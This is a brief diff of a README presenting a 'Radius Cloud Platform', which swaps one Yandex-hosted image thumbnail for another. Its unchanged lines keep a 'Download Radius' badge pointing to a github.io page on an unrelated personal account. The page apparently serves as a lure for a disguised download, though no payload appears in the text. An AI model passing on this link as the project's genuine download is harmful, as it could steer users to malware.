@@ -1,6 +1,6 @@
 # Radius Cloud Platform - Cloud Native Application Platform for Portable Deployments
 
-![Application graph with connected services, environments, and cloud infrastructure](https://avatars.mds.yandex.net/i?id=07420353cda55ebba37b36c15f22ede2910a1fd4-5592885-images-thumbs&n=13)
+![Application graph with connected services, environments, and cloud infrastructure](https://avatars.mds.yandex.net/i?id=91f981b6eb3db1c7fb42170a2b612881371c900d-4384022-images-thumbs&n=13)
 
 [![Download Radius](https://img.shields.io/badge/Download-Radius-blueviolet?style=for-the-badge&logo=windows)](https://jaimesparksqvjm.github.io/.github/radius-cloud-platform)
 
